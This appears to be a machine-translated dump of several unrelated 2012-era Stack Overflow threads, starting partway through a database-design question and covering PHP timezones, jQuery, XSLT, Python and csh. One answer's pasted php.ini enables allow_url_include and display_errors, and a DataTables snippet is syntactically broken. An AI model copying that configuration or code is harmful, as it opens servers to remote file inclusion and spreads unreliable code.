> 标签：mysql, mongodb, ruby-on-rails-3, database, nosql

我的应用程序数据库 (MySQL) 中有一个连接表，它大量增长。

我有 2 个模型用户和产品，用户有很多产品要查看，产品属于许多用户如何查看。
开始时，所有用户都可以查看所有产品，并且用户可以编辑他可以查看的产品。

表大小将是 (n*m) n 是用户数（很大），m 是产品数（也很大）的问题，并且对表的读取操作会很慢。

示例：我有 3 个用户的 id 为：“1,2,3”
，3 个产品的 id 为：“1,2,3”

所以 users_products 表将是：

> user_id, product_id
> 1 , 1
> 1 , 2
> 1 , 3
> 2 , 1
> 2 , 2
> 2 , 3
> 3 , 1
> 3 , 2
> 3 , 3

我对所有解决方案持开放态度，从重新设计此部分以使用另一个数据库系统开始。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:12:03.453

我认为你假设的东西可能不是真的。即使有很多行，SQL 服务器也能快速处理这类查询。如果您有良好的索引，则可以快速查询具有 1000 万条记录的表。

在进行各种过早的优化之前，我建议您进行一些测试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:02:51.447

你看过 Neo4J 吗？这是一个有据可查的图形数据库，我认为它非常适合这个特定的用例。您进行建模的方式非常简单。

每个用户和每个产品都由一个节点表示。您要么在它们之间创建关系“IS_ABLE_TO_SEE”，要么不创建。

然后，您可以使用一系列功能再次检索此数据。我最喜欢的是使用遍历，从一个节点开始，然后遍历关系（您可以选择要遍历的关系和方向）。但是，这对于检索彼此相距几个深度的数据更有用。

在我们的特定用例中，您可以执行一个简单的查询，返回通过关系“IS_ABLE_TO_SEE”连接到您的用户节点的所有产品节点。

Neo4J 非常适合没有图形数据库经验的人使用，正如我所说，它非常适合您在此处展示的用例。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T20:45:20.927

正如 Pieter-Jan 指出的 Neo4J 有替代解决方案，我是 Couchbase 和 Neo4J 的忠实粉丝。这是一个简单的列表，关系表不太适合这些操作。

在 Couchbase 中，您可以通过多种方式执行此操作，一种是使用简单的 client.append 来保留产品列表，然后使用单个 client.get 来检索列表。有了这个，有两种可能性，在追加之前进行重复数据删除，或者在之后进行重复数据删除。获取列表的速度非常快，将消除任何形式的查询。

另一种方法是使用 JSON，并拥有一个用户可以访问和查看的每个产品的数组，等等。与上面第一个示例中的简单字符串相同，除非你可以在它上执行 Map/Reduce JSON，如果需要。

在这两种情况下，它都会胜过任何类型的查询。

# alfresco - Alfresco Share：如何检索一个组件消息包？

> ID：13916477
> 
> 赞同：0
> 
> 时间：2012-12-17T14:55:51.493
> 
> 标签：alfresco, alfresco-share

我想在自定义页面上重用一些文档库包。

我已经浏览了代码并看到当加载 doclib webscript 时，它会进入在级别`setMessages()`初始化的那个函数。`Alfresco.messages.scope['Alfresco.DocumentList']`

我遇到的问题显然是在我的自定义页面上，我没有任何`Alfresco.DocumentList`可用范围的消息。

有没有办法从自定义组件或 webscript 中检索文档列表包，并将其传递给 ftl 或其他东西。我想所有这些都是 Spring surf 内部的，但我看不到自己复制了这些捆绑包。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-18T09:54:08.697

组件包的关键在于它们仅特定于该组件。包含这些消息的唯一方法是在您的页面上包含该组件（然后您可以通过 CSS 从视图中隐藏它） - 然后您的其他组件将能够使用您描述的方法访问这些消息。

但是，您可能会发现这并不理想，在这种情况下，您唯一的选择是物理复制消息，或者（有点 hacky，但可以工作）使用可扩展性模块将`documentlist.get`Web 脚本的内容覆盖在您的自定义 Web 上脚本。

# php - PHP date_default_timezone_set()

> ID：13916481
> 
> 赞同：7
> 
> 时间：2012-12-17T14:56:08.277
> 
> 标签：php, timezone

在 php 中，有没有办法在 .htaccess 或任何地方设置默认时区，只要我不必在每个 php 页面上都设置它。

前提是我无权访问服务器，只有 PHP 文件。提前致谢

**更新**

我正在使用 apache (LAMP)，并且无法访问 php.ini

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-17T14:59:57.270

考虑到您提到 .htaccess 的事实是使用 apache：

是的，只要它运行 mod_php 就可以在 .htaccess 中像这样：

```
php_value date.timezone "Europe/Berlin" 
```

或者您可以像 Karl Laurentius Roos 建议的那样在 php.ini 中设置 date.timezone。这只有在您可以访问您的 php 配置时才有可能。请记住在更改 php.ini 后重新启动 PHP（CGI 模式）或您的网络服务器（mod_php）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-17T14:58:02.243

`date.timezone`在你的 php.ini 中设置。支持的时区值： http: [//php.net/manual/en/timezones.php](http://php.net/manual/en/timezones.php)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-04-08T20:32:50.943

我使用代码得到 500（内部服务器错误）

`php_value date.timezone "Europe/Berlin"`.

然后我尝试了，`SetEnv TZ Australia/Melbourne`它就像一个魅力。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-02-13T02:56:58.740

如果您收到 500 错误，您可能会尝试检查 PHP5 模块，它对我有用。

```
<IfModule mod_php5.c>
php_value date.timezone "Europe/Lisbon"
</IfModule> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-03-22T08:06:41.333

**在 CPanel 服务器的.htaccess**文件中添加以下代码后。
我曾经得到 500（内部服务器错误）

```
#Adjust default time zone 

<IfModule mod_php5.c>
    php_value date.timezone "Asia/Kolkata"
</IfModule>

SetEnv TZ Asia/Kolkata 
```

然后我导航到**cPanel MultiPHP INI 编辑器（主页 >> 软件 >> MultiPHP INI 编辑器）>> 编辑 PHP INI 设置**
**或**
转到路径**/homecws/Your_folder_name/public_html/php.ini**然后包含
`date.timezone=Asia/Kolkata`在**php.ini**文件中

这是完整的 php.ini 文件

```
; magic_quotes_gpc = Off;
; register_globals = Off;
; default_charset   = UTF-8;
; memory_limit = 64M;
; max_execution_time = 36000;
; upload_max_filesize = 999M;
; safe_mode = Off;
; mysql.connect_timeout = 20;
; session.auto_start = Off;
; session.use_only_cookies = On;
; session.use_cookies = On;
; session.use_trans_sid = Off;
; session.cookie_httponly = On;
; session.gc_maxlifetime = 3600;
; allow_url_fopen = on;
; ;display_errors = 1;
; ;error_reporting = E_ALL;

allow_url_fopen = On
allow_url_include = On
asp_tags = Off
display_errors = On
enable_dl = Off
file_uploads = On
max_execution_time = 300
max_input_time = 600
max_input_vars = 10000
memory_limit = 512M
session.gc_maxlifetime = 14400
session.save_path = "/var/cpanel/php/sessions/ea-php56"
upload_max_filesize = 2000M
post_max_size = 8M
zlib.output_compression = On
date.timezone = Asia/Kolkata 
```

这解决了我的问题并为我工作。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-06-26T19:55:48.787

如果服务器配置正确并且您想将您的进程时区设置为此服务器值（如果未设置），那么`.htaccess`您可以在 doc-root 中设置一个 PHP 文件以在任何其他 PHP 文件之前运行 - 并在此文件中您可以定义几个配置、函数和类作为“工具”使用，这些工​​具将在所有其他 PHP 文件中可用 - 如下所示：

**.htaccess**

```
php_value auto_prepend_file "path/of/file.php" 
```

**路径/of/file.php**

```
date_default_timezone_set(ini_get('date.timezone')); 
```

# javascript - 窗口调整大小在 Chrome 和 FireFox 中触发两次，但在 Safari 中只有一次

> ID：13916485
> 
> 赞同：0
> 
> 时间：2012-12-17T14:56:31.933
> 
> 标签：javascript, jquery, window-resize

我使用这段代码在最新版本的 Chrome、FX 和 Safari 下进行了测试。如果我按下最大化按钮，它会在 FX 和 Chrome 中触发两次，但在 Safari 中只会触发一次。我使用的是 Windows 7。令人惊讶的是，如果我使用 Windows XP，Chrome 会触发两次，而 FX、Safari 会触发一次。是否可以保证它会触发两次？谢谢

```
$(window).resize(function() {

    if (!isiPhone()) {
        if ($(".viewportBinder").length){                   
            $("#view").css('height',$(window).height());
            $("#view").css('width',$(window).width());  
            content = element.viewport('update'); 
        }

        var h = screen.height;
        var w = screen.width;

        $(window).css("height",h);
        $(window).css("width",w);

        Book.book_position();
        Book.zoom_auto();

        /*
        var is_firefox = navigator.userAgent.indexOf('Firefox') > -1;
        var is_safari = navigator.userAgent.indexOf("Safari") > -1;

        if ((is_firefox)||(is_safari))*/
        alert ('test');
    }   

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:03:32.450

这不是问题。它依赖于浏览器。您将需要处理这种情况。

如果参数相同，记住你的最后一个动作并忽略它怎么样。

您可以编写如下代码：

```
function myResizer() {
    if (!isiPhone()) {
        if ($(".viewportBinder").length) {                   
            var height, width;
            height = $(window).height();
            width = $(window).width();
            if ((myResizer.height !== height) || (myResizer.width !== width)) {
                $("#view").css('height',$(window).height());
                $("#view").css('width',$(window).width());  
                content = element.viewport('update'); 
                myResizer.height = height;
                myResizer.width = width;
            }
        }

        var h = screen.height;
        var w = screen.width;

        if ((myResizer.h !== h) || (myResizer.w !== w)) {
            $(window).css("height",h);
            $(window).css("width",w);

            Book.book_position();
            Book.zoom_auto();
            myResizer.h = h;
            myResizer.w = w;
        }
    }   
}

$(window).resize(myResizer); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:04:32.880

resize 事件不会触发，如果您调整浏览器的大小......它会触发多次，可能针对每个像素，不知道。这取决于浏览器...

另请参阅：[javascript resize event triggering multiple times while draging the resize handle](https://stackoverflow.com/questions/667426/javascript-resize-event-firing-multiple-times-while-dragging-the-resize-handle)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T16:00:58.183

我想，这不是什么大问题。我解决了这个问题，通常使用调整大小完成时触发的方法。

```
var after_resize = (function(){
var timer = 0;
return function(callback, ms){
    clearTimeout (timer);
    timer = setTimeout(callback, ms);
};
})();
$(window).resize(function() {
after_resize(function(){
    alert("resize finish!");
}, 300);
}); 
```

# java-me - 带有自定义按钮的对话框，LWUIT，J2ME

> ID：13916486
> 
> 赞同：0
> 
> 时间：2012-12-17T14:56:33.913
> 
> 标签：java-me, lwuit

我想在我的 J2ME LWUIT 应用程序中显示一个对话框。在对话框中，我可以添加文本区域和按钮。现在我想在单击按钮时关闭对话框。我的代码在下面，我想在按下“确定”按钮的同时关闭按钮。

```
 Container dispback = new Container(new BoxLayout(BoxLayout.Y_AXIS));
               TextArea textArea = new TextArea(Message); //pass the alert text here
               textArea.setFocusable(false);
               textArea.setEditable(false);
               Font fnt=Font.createSystemFont(Font.FACE_SYSTEM, Font.STYLE_BOLD, Font.SIZE_MEDIUM);
               textArea.getStyle().setFont(fnt);
               textArea.getSelectedStyle().setBorder(null);
               textArea.getUnselectedStyle().setBorder(null);
               textArea.getStyle().setFgColor(0xFF0000);
               textArea.getStyle().setBgTransparency(0);
               textArea.setIsScrollVisible(false);
               textArea.getStyle().setMargin(20,0,0,0);

               Button okbut = new Button("OK");
               //okbut.setAlignment(Component.CENTER);
               okbut.getStyle().setFont(fnt);
               okbut.addActionListener(new ActionListener() {

                       public void actionPerformed(ActionEvent ae)
                       {
                        **//How to close my dialog here**   
                       }
                       });

               dispback.addComponent(textArea);
               okbut.setWidth(10);
               dispback.addComponent(okbut);

               Dialog.show("SnorkelOTP-Info", dispback, null,0,null); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-18T07:54:32.143

为什么你不使用对话框并在他身上添加所有组件？

如果你使用它，你只能在动作 premford 函数中编写：

okbut.addActionListener(new ActionListener() {

public void actionPerformed(ActionEvent ae) { dialogName.dispose();
} } );

你不能处置容器。您唯一能做的就是给他 null 并再次执行表单。

# google-maps - Google Maps v3：应用程序配置不允许给定 URL

> ID：13916488
> 
> 赞同：2
> 
> 时间：2012-12-17T14:56:49.763
> 
> 标签：google-maps

我正在研究 Google Maps v3 API，在您可以看到的 HTML 静态页面上一切正常。但是当我使用我现有的网站（由 CodeIgniter 完成）时，代码会显示错误消息：

> 应用程序配置不允许给定 URL。：应用程序的设置不允许一个或多个给定 URL。它必须与网站 URL 或画布 URL 匹配，或者域必须是应用程序域之一的子域。

我正在设置推荐人，但没有运气。

# redirect - Sharepoint 2010 文件夹的自定义重定向

> ID：13916489
> 
> 赞同：0
> 
> 时间：2012-12-17T14:56:53.273
> 
> 标签：redirect, sharepoint-2010, default

当我在“rootWeb”（mysite.com）地址上访问我的网站时，我被重定向到“rootWeb/Pages/Default.aspx”

我的公司在“company.com/Exchange2010”上有一个交换网络访问权限。
现在由于“company.com”是新的共享点门户，它要求交换访问保持不变......
所以我创建了一个名为 Exchange2010 的库并插入了文件......但是，一切都可以正常工作用户必须输入完整的网址“company.com/Exchange2010/default.asp”（default.asp 是文档库中的一个文件）
现在我想将重定向从“/forms/allfiles.aspx”更改为“/默认.asp"...

我怎样才能做到这一点？？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T18:43:31.757

你能澄清一下你到底需要什么吗？

如果您在 SharePoint 中创建一个名为“MySpecialFolder”的新站点，并浏览到“rootWeb/MySpecialFolder”，您将被自动重定向到“rootWeb/MySpecialFolder/Pages/default.aspx”。这是 SharePoint 上的 OOTB 行为。

如果您真的想删除“/Pages”，并将“default.aspx”更改为“MyPage.aspx”。您可以使用 IIS 中的 url 重写模块，该模块通过匹配正则表达式来更改 url。这可以工作，但会花费您大量时间来理解重写模块，会导致很多副作用，并且更改 SharePoint 默认的工作方式是不好的。

您出于什么原因需要它，您能否详细说明要实现的目标？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T16:40:31.253

我最终解决了这个问题，我创建了一个明确包含的网站集，并将网站集的默认页面设置为我的自定义页面......

这不是一个漂亮的解决方案...如果有人提出更好的解决方案，我将标记为答案...

# c# - 验证动态添加的 UserControl

> ID：13916493
> 
> 赞同：0
> 
> 时间：2012-12-17T14:57:22.307
> 
> 标签：c#, winforms

我已经动态添加了一个用户控件到一个winform面板我已经动态添加了控件所以我想验证winform中的控件所以我使用了这个方法

```
 private bool mobilemanu()
    {
        return panel1.Controls.OfType<UserControl1>().Select(uc => uc.comboBox1).Any(cb => cb.Text == String.Empty);
    } 
```

在我使用的按钮单击事件中

```
 private void button2_Click(object sender, EventArgs e)
    {
        bool mobil = mobilemanu();

        if (!mobil)
{
    //do this
}
    else
{
    //do that
}
} 
```

除了这样，我还使用此代码来显示哪个控件未正确填充，但它仅将第一个控件显示为错误我是编程新手，所以我在这里有点困惑

```
 private void mobilemanuval()
    {
        bool val = mobilemanu();
        if (val == true)
        {
            foreach (Control ctrl in panel1.Controls)
            {
                if (ctrl is UserControl1)
                {
                    UserControl1 myCrl = ctrl as UserControl1;

                    {
                        if (myCrl.comboBox2.Text == string.Empty)
                        {
                            errorProvider1.SetError(myCrl.comboBox1, "entersomething");
                        }
                        if (myCrl.comboBox2.Text == string.Empty)
                        {
                            errorProvider1.SetError(myCrl.comboBox2, "entersomething");
                        }

                    }

                }
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:05:39.030

Maybe you just mixed up controls because their names only differ in last letter of the name (digit)? Does this work:

```
 if (myCrl.comboBox1.Text == string.Empty)
                    {
                        errorProvider1.SetError(myCrl.comboBox1, "entersomething");
                    }
                    if (myCrl.comboBox2.Text == string.Empty)
                    {
                        errorProvider1.SetError(myCrl.comboBox2, "entersomething");
                    } 
```

# javascript - 如何在 OpenLayers 的单个 KML 文件中切换多个多边形的选择

> ID：13916496
> 
> 赞同：0
> 
> 时间：2012-12-17T14:57:32.617
> 
> 标签：javascript, openlayers

我有一个 KML 文件，其中包含大约 8-9 个多边形。有关这些多边形的更多信息，单击时会出现一个弹出窗口。其中一些多边形完全重叠，单击时将选择重叠区域。

我希望能够选择隐藏在顶部多边形下方的多边形。我想知道是否有一种方法可以在每次单击该位置时切换选定的多边形，或者甚至如何在 OpenLayers 中处理具有多个多边形的 KML。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:09:39.493

这个问题比较适合[https://gis.stackexchange.com/](https://gis.stackexchange.com/)

看看[https://gis.stackexchange.com/questions/29223/dealing-with-overlapping-features-in-openlayers](https://gis.stackexchange.com/questions/29223/dealing-with-overlapping-features-in-openlayers)

# c# - 如何在 SOA DDD 环境中以正确的方式实施监控？

> ID：13916501
> 
> 赞同：1
> 
> 时间：2012-12-17T14:58:02.770
> 
> 标签：c#, domain-driven-design, monitoring, soa, bounded-contexts

我们尝试在我们的项目中遵循 SOA 和 DDD 原则。我们使用 NServicebus 作为消息总线。到目前为止，我们有 20 多项服务。

你们如何设置监控（我不是在谈论技术监控——比如服务“xyz”是否可达——硬盘是否已满）？

**例如**

如果下订单并在 5 天后完成发货，但它应该在 1 天后执行......这是一个错误情况。

或者另一个例子：运输完成。现在我们向客户发送电子发票。我们必须存档该发票并与第三方（存档提供商）异步交谈以检索我们的发票。如果 5 天后仍未检索到该发票……那就是错误情况。

在定义如何对错误的标准和放置这些标准的位置进行建模时，我遇到了问题。

**在哪里 ...**

...您是否设置了监控规则？

监控规则是您的有限上下文的一部分吗？我想是的。
监控规则是否与实体直接相关？我想不是。
监控规则是否与聚合直接相关？我想不是。

监控规则就像跨多个聚合的域服务，但与域服务相反，它也可以跨多个有界上下文。

谁负责？

**如何 ...**

...您是否在代码中设置了监控规则？

如果你想把它做对，它真的需要付出很大的努力。否则，您可以非常便宜地做到这一点（在这里和那里进行一些查询），但那是针对 SOA 的（我关心的主要部分）

请指导我找到一个清晰且易于实施的解决方案。

我也很高兴了解您如何设置它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T20:00:12.867

首先要确定的是您感兴趣的一组**事件**。您已经有一些示例，例如订单发货延迟、发票检索延迟等。从业务角度来看，这些事件具有特定的含义和具体后果。决定这些事件的标准应该与领域专家一起完成——他们应该能够说诸如“当订单在 1 天后没有发货时应该发生”之类的事情。

这当然不同于实现这种[事件驱动的架构](http://en.wikipedia.org/wiki/Event-driven_architecture)。实现上述时间触发事件的一种方法是运行一个按计划运行查询的连续过程。此查询将检索在运行查询时满足事件标准的实体集。生成的系统将发布这些时间触发事件。这些事件的 NServiceBus 处理程序会将事件的处理委托给领域层。

关于位置，我同意这些事件的定义和处理通常与特定的有界上下文相关联。然而，它们可以跨越多个 BC，例如当来自一个 BC 的事件在另一个 BC 中处理时。至于代码的物理放置，事件处理程序应该靠近相应的域逻辑。例如，您可能有一个运输 BC，要求在运输迟到时发送一条消息。在这种情况下，整个工作流程将包含在单个 BC 中，可以使用单个 VS 解决方案来实现。

这些事件的方式应该是上述基础设施的一部分。另一方面，事件的处理应该委托给领域层。例如，您可以拥有`OrderShippingIsLate`使用 NServiceBus 发布消息的基础设施。在运输 BC 解决方案中，您将拥有此消息类型的 NServiceBus 处理程序，它将调用处理此消息的应用程序服务（通过为支持代表添加任务、发送某种警告等）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-18T18:00:21.957

我同意您的监控应该在域服务中完成。阅读[这本书](http://www.martinfowler.com/apsupp/spec.pdf)，了解规范模式以及如何实现它。他们的例子非常接近你的场景。

# xslt - XSLT 连接元素

> ID：13916505
> 
> 赞同：0
> 
> 时间：2012-12-17T14:58:10.013
> 
> 标签：xslt

我不是 XSLT 专家，在这里寻求帮助。

这是我的 XML 输入：

```
<?xml version="1.0" encoding="UTF-8"?>
<Target_Root>
<RecordHeader>
    <FileHeader>1234567</FileHeader>
</RecordHeader>
<TransDetails>
    <TransHeader>
        <FileHeaderRec/>
        <BatchHeaderRec/>
        <OrderingPartyRec/>
        <TransBody>
            <TransactionRec/>
            <DescRec>
                <_0160>
                    <RecordCode>1</RecordCode>
                    <VariantCode>A</VariantCode>
                    <Description>Srii1 </Description>
                </_0160>
            </DescRec>
            <DescRec>
                <_0160>
                    <RecordCode>1</RecordCode>
                    <VariantCode>A</VariantCode>
                    <Description>Srii2</Description>
                </_0160>
            </DescRec>
            <NameBenRec/>
            <CityBenRec/>
        </TransBody>
                    <TransBody>
            <TransactionRec/>
            <DescRec>
                <_0160>
                    <RecordCode>1</RecordCode>
                    <VariantCode>A</VariantCode>
                    <Description>Srii3 </Description>
                </_0160>
            </DescRec>
            <DescRec>
                <_0160>
                    <RecordCode>1</RecordCode>
                    <VariantCode>A</VariantCode>
                    <Description>Srii4</Description>
                </_0160>
            </DescRec>
            <NameBenRec/>
            <CityBenRec/>
        </TransBody>
    </TransHeader>
    <BatchTrailerRec/>
    <FileTrailerRec/>
</TransDetails> 
```

我的预期输出是：

```
<?xml version="1.0" encoding="UTF-8"?>
<Target_Root>
<RecordHeader>
    <FileHeader>1234567</FileHeader>
</RecordHeader>
<TransDetails>
    <TransHeader>
        <FileHeaderRec/>
        <BatchHeaderRec/>
        <OrderingPartyRec/>
        <TransBody>
            <TransactionRec/>
            <DescRec>
                <_0160>
                    <RecordCode>1</RecordCode>
                    <VariantCode>A</VariantCode>
                    <Description>Srii1 Srii2</Description>
                </_0160>
            </DescRec>
            <NameBenRec/>
            <CityBenRec/>
        </TransBody>
        <TransBody>
            <TransactionRec/>
            <DescRec>
                <_0160>
                    <RecordCode>1</RecordCode>
                    <VariantCode>A</VariantCode>
                    <Description>Srii3 Srii4</Description>
                </_0160>
            </DescRec>
            <NameBenRec/>
            <CityBenRec/>
        </TransBody>
    </TransHeader>
    <BatchTrailerRec/>
    <FileTrailerRec/>
</TransDetails> 
```

如所见，我试图连接属于一个上下文 id 的段下的元素值。虽然我可以使用我的内部应用程序来完成，但这似乎非常耗时。以前有人遇到过这个要求吗？在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T16:09:35.787

您可以建立在身份转换的基础上。请参阅评论以获取解释。

对**XSLT 1.0**的建议：

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  version="1.0">

  <!-- Identity transform -->
  <xsl:template match="node()|@*">
    <xsl:copy>
      <xsl:apply-templates select="node()|@*"/>
    </xsl:copy>
  </xsl:template>

  <!-- Do nothing for DescRec elements that have a preceding sibling DescRec -->
  <xsl:template match="DescRec[preceding-sibling::DescRec]"/>

  <!-- For Description elements, concatenate the content of all the Description elements
       within the same TransBody context -->
  <xsl:template match="Description">
    <xsl:copy>
      <xsl:for-each select="ancestor::TransBody//Description">
        <xsl:value-of select="."/>
      </xsl:for-each>
    </xsl:copy>
  </xsl:template>

</xsl:stylesheet> 
```

对于**XSLT 2.0**：

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  version="2.0">

  <!-- Identity transform -->
  <xsl:template match="node()|@*">
    <xsl:copy>
      <xsl:apply-templates select="node()|@*"/>
    </xsl:copy>
  </xsl:template>

  <!-- Do nothing for DescRec elements that have a preceding sibling DescRec -->
  <xsl:template match="DescRec[preceding-sibling::DescRec]"/>

  <!-- For Description elements, concatenate the content of all the Description elements
       within the same TransBody context -->
  <xsl:template match="Description">
    <xsl:copy>
      <xsl:value-of select="ancestor::TransBody//Description" separator="''"/>
    </xsl:copy>
  </xsl:template>

</xsl:stylesheet> 
```

# python - 定义python变量的地方

> ID：13916507
> 
> 赞同：0
> 
> 时间：2012-12-17T14:58:12.753
> 
> 标签：python, variables

有没有办法知道变量在 python 中定义的位置（例如文件名）？

我遇到了以下问题：在一个项目的源文件中，有一个“打印变量”语句，并且该文件中没有定义变量，我找不到定义变量的位置。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:01:23.943

不，不适用于变量。变量只是对任意python对象的引用，如果你能找到变量，你就找到了定义它的函数、类或模块。

我怀疑您想知道在哪里定义了 python*对象*；对于许多可以从对象的`.__file__`属性来确定的对象。对于类，您必须首先遍历它的模块，对于方法，遍历它的函数，对于函数，找到它的代码对象，对于代码对象，使用它们的`.co_filename`属性等。

或使用该[`getsourcefile()`功能](http://docs.python.org/2/library/inspect.html#inspect.getsourcefile)自动化该过程：

```
>>> import inspect
>>> inspect.getsourcefile(inspect.getsourcefile)
'/usr/lib/python2.6/inspect.py' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:00:03.153

您可以使用`inspect`模块来获取定义对象的信息：http: [//docs.python.org/2/library/inspect.html#inspect.getsourcefile](http://docs.python.org/2/library/inspect.html#inspect.getsourcefile)

# php - 使用属性运行 PHP

> ID：13916509
> 
> 赞同：-3
> 
> 时间：2012-12-17T14:58:21.303
> 
> 标签：php, exec

我不会直接从我的 php 文件中运行具有属性的用户硬盘中的 exe。

我的 php 文件读取 xml 数据并列出如下内容：

```
$table_string .= "<tr><td>$attrs[ip]</td><td>$attrs[server]</td><td>$attrs[country]</td></tr>"; 
```

如果用户单击其中一个表字符串，则应询问他/她 exe 在哪里并使用属性运行它。

示例：“file.exe”-连接：单击的表行 ip

对不起我的英语，我希望我对我的问题很清楚，任何帮助都会很棒。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:03:18.293

First of all php is a server-side language. So it doesn't know anything about the client systems harddrive. You won't be able to run a client-side program with php.

However even a client-side language won't be able to do this. It is impossible for websites to run anything on the users computer and this is for good reason!!! It would be a huge security hole if you would be able to.

# java - 使用准备好的语句插入数字字段

> ID：13916512
> 
> 赞同：0
> 
> 时间：2012-12-17T14:58:43.220
> 
> 标签：java, sql-server, prepared-statement

我尝试使用准备好的语句向 SQL 服务器数字字段插入一个值：

```
int temp = 5;
type = java.sql.Types.NUMERIC;                      
System.out.println(temp);
prd.setObject(i+1, temp,type); 
```

但这给了我一个`"Arithmetic overflow error converting numeric to data type numeric"`.

我还尝试将 int 转换为 Number 或使用 插入它`prd.setInt`，但这也不起作用。

在准备好的语句中设置值的正确方法是什么，它将成功插入到 SQL 服务器数字字段中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-18T14:43:44.680

事实证明，当您将 String 转换为 int 时，由于某种原因，在尝试插入准备好的语句时转换不起作用。

```
int temp= 2;
type = java.sql.Types.NUMERIC;                      
System.out.println(temp);
prd.setObject(i+1, temp,type); 
```

这样可行。

在我的初始代码中，我做了： Integer.parseInt(String_value) 并且由于某种原因破坏了变量。

# shell - C shell登录脚本中的函数而不是别名

> ID：13916515
> 
> 赞同：13
> 
> 时间：2012-12-17T14:58:50.647
> 
> 标签：shell, login, alias

我在[这个](https://stackoverflow.com/questions/941338/shell-script-how-to-pass-command-line-arguments-to-an-unix-alias)主题中看到，如果你想使用参数，你可以在 shell 登录脚本中添加一个函数而不是别名。但是，我将以下代码放在我的 .cshrc 文件中的别名部分：

```
function gf()
{
    grep -n $1 `find .` | grep -v "can't open"
} 
```

但是当我键入 source .cshrc 时，我收到错误消息：Badly placed ()'s。C shell 的语法与 Bash shell 的语法不同吗？如果是这样，正确的语法是什么？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-17T15:00:49.730

不幸的是，您不能`csh`像在大多数其他 shell 中那样定义函数。中不存在此功能`csh`。

唯一的选择是创建一个脚本并将其放置在您的`PATH`eg目录中`~/bin`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-02-24T00:05:49.933

这是我的解决方案：

```
#!/bin/csh

if ("$1" == "run") goto $2

echo "Now in default mode"

echo "Calling myself"

csh -f dummy run sub1

csh -f dummy run sub2

exit

sub1:

echo "In sub1"

exit

sub2:

echo "In sub2"

exit 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-12-19T00:53:41.503

如果您只想传递一个论点，只需将论点放在`\!$`您希望论点所在的位置即可。

例如：

如果你投入`alias mygrep grep -i \!$ myfile.txt`，`~/.cshrc`并且运行`mygrep mykeyword`，`csh`就会运行`alias mygrep grep -i mykeyword myfile.txt`。

有关更多信息，请参阅[此](https://docstore.mik.ua/orelly/unix3/upt/ch29_03.htm)内容。

# javascript - Jquery DataTables 插件 - 隐藏列名行

> ID：13916518
> 
> 赞同：8
> 
> 时间：2012-12-17T14:59:04.537
> 
> 标签：javascript, jquery, css, jquery-datatables

我正在开发一个网络应用程序，它在不同的视图中显示了几个（~5）不同的数据表。我尝试使用列名称隐藏第一行，仅用于其中一个数据表（但将另一行保留在该行中），但没有成功。我发现的大多数解决方案都使用 CSS，这导致该行从我的应用程序的所有数据表中消失。有人知道一个好的解决方案吗？

这是我如何在我的应用程序中创建数据表的示例：

```
this._currentDiv = $('<div></div>');
this._stopsTable = $('<table></table>');
$(this._currentDiv).append(this._stopsTable);
$(this._currentDiv).append(self._stopsTable);
        $(this._currentDiv).append(data);
        $(this._stopsTable).dataTable({
            "bJQueryUI": true,
            "bPaginate":false,
            "bLengthChange":false,
            "bFilter":false,
            "bSort":false,
            "bInfo":false,
            "bAutoWidth":false,
            "sScrollY": "100px",
            "aoColumns":[
                { "sTitle":"a" },
                { "sTitle":"b" },
                { "sTitle":"c" }
            ]
        }); 
```

这是我尝试过的css代码：

```
.dataTables_wrapper table thead {
    display:none;
} 
```

如果可用，我更喜欢 JavaScript 解决方案。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-17T15:03:39.837

If you want a javascript solution, you can use the `fnInitComplete` parameter of datatable.

```
$(this._stopsTable).dataTable({
    "bJQueryUI": true,
    "bPaginate":false,
    "bLengthChange":false,
    "bFilter":false,
    "bSort":false,
    "bInfo":false,
    "bAutoWidth":false,
    "sScrollY": "100px",
    "aoColumns":[
        { "sTitle":"a" 
           "sTitle":"b" 
           "sTitle":"c" }
    ],
    "fnInitComplete" : function(oSettings, json) {
        // Find the wrapper and hide all thead
        $(this._stopsTable).parents('.dataTables_wrapper').first().find('thead').hide();
    }
}); 
```

When jQuery datatable use a scroll, the html structure is very different. jQuery datatables use a "second table" to handle the thead. So you can scroll and look at the thread anytime. So if you want to remove the good thead, you need to retrieve the dataTable wrapper.

Of course, if you do that way for all tables, it will hide all thead of all your tables. So you must use something to know if you must hide the first row for the current table (a css class or an attribute on the table).

